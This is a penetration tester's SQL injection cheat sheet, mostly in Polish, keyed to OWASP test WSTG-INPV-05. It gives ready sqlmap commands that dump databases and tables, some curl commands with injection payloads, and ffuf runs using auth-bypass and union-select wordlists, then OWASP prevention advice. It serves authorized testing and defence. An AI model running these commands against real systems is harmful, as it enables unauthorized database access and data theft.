# WSTG-INPV-05 — Testing for SQL Injection

## Cele

- Identify SQL injection points
- Assess the severity of the injection and the level of access that can be achieved

## KOMENDY

### sqlmap - automatyczne wykrywanie i eksploitacja

```bash
sqlmap -u "https://TARGET/page?id=1" --batch --level=3 --risk=2 -o
sqlmap -u "https://TARGET/page?id=1" --batch --dbs
sqlmap -u "https://TARGET/page?id=1" --batch --tables -D database_name
sqlmap -u "https://TARGET/page?id=1" --batch --dump -D database_name -T table_name

```

### sqlmap z POST

```bash
sqlmap -u "https://TARGET/login" --data="username=admin&password=test" --batch --level=3

```

### sqlmap z cookie

```bash
sqlmap -u "https://TARGET/page" --cookie="session=TOKEN;id=1" --level=3 --batch

```

### sqlmap z plikiem request z Burp

```bash
sqlmap -r request.txt --batch --level=5 --risk=3

```

### ghauri - alternatywa dla sqlmap

```bash
ghauri -u "https://TARGET/page?id=1" --batch --level=3

```

### Reczne testowanie

```bash
curl -s "https://TARGET/page?id=1'" | head -50
curl -s "https://TARGET/page?id=1 OR 1=1--" | head -50
curl -s "https://TARGET/page?id=1 AND 1=2--" | head -50
curl -s "https://TARGET/page?id=1 UNION SELECT NULL--" | head -50
curl -s "https://TARGET/page?id=1; WAITFOR DELAY '0:0:5'--"
curl -s "https://TARGET/page?id=1' AND SLEEP(5)--"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings SQLi payloads

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_Fuzz.txt" -mc all -o output_ffuf_sqli_fuzz.json

```

### Auth Bypass payloads

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Auth_Bypass.txt" -mc 200,302 -o output_ffuf_sqli_auth.json

```

### Error-based detection

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_ErrorBased.txt" -mc all -o output_ffuf_sqli_error.json

```

### Time-based blind (MySQL)

```bash
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/FUZZDB_MySQL-WHERE_Time.txt
# Wordlista: Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_TimeBased.txt

```

### Union Select

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/Generic_UnionSelect.txt" -mc all -o output_ffuf_sqli_union.json

```

### Polyglots

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w "Desktop/WSTG/PayloadsAllTheThings-master/SQL Injection/Intruder/SQLi_Polyglots.txt" -mc all -o output_ffuf_sqli_poly.json

```

### fuzzdb SQL Injection detect

```bash
ffuf -u "https://TARGET/page?id=FUZZ" -w Desktop/WSTG/fuzzdb-master/attack/sql-injection/detect/xplatform.txt -mc all -o output_ffuf_fuzzdb_sqli.json

```

### SecLists login bypass

```bash
ffuf -u "https://TARGET/login" -X POST -d "username=FUZZ&password=test" -w Desktop/WSTG/SecLists-master/Fuzzing/login_bypass.txt -mc 200,302 -o output_ffuf_login_bypass.json

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj wszystkie parametry wejsciowe (GET, POST, Cookie, Headers)
2. Wstaw apostrof (') i sprawdz czy pojawia sie blad SQL
3. Testuj boolean-based: AND 1=1 vs AND 1=2 (roznica w odpowiedzi)
4. Testuj time-based: SLEEP(5), WAITFOR DELAY, pg_sleep(5)
5. Testuj UNION SELECT do wyciagania danych
6. Sprawdz error messages pod katem ujawnienia bazy danych
7. Testuj blind SQLi przez roznice w odpowiedziach
8. Sprawdz second-order SQLi (payload zapisany i uruchomiony pozniej)


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — SQL_Injection_Prevention_Cheat_Sheet.md, Query_Parameterization_Cheat_Sheet.md

- ZAWSZE uzywaj prepared statements / parameterized queries — to primary defense
- Stored procedures jako secondary defense (tez moga byc podatne jesli uzywaja dynamicznego SQL)
- Allowlist input validation jako dodatkowa warstwa — nie jako jedyna obrona
- Escapowanie inputu to OSTATECZNOSC — tylko gdy inne metody niemozliwe
- Zasada least privilege: konto DB aplikacji z minimalnymi uprawnieniami
- Uzywaj ORM (Hibernate, SQLAlchemy) — ale uwazaj na raw queries i HQL injection

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| SQLiPy | Integracja SQLMap z Burp przez SQLMap API | [GitHub](https://github.com/codewatchorg/sqlipy) |
| burp-xss-sql-plugin | Wykrywanie XSS i SQL Injection | [GitHub](https://github.com/attackercan/burp-xss-sql-plugin) |
| Burptime | Pomiar czasu odpowiedzi dla time-based SQLi | [GitHub](https://github.com/virusdefender/burptime) |
| SQLi Query Tampering | Generator payloadow SQLi z obfuskacja | [GitHub](https://github.com/xer0days/SQLi-Query-Tampering) |
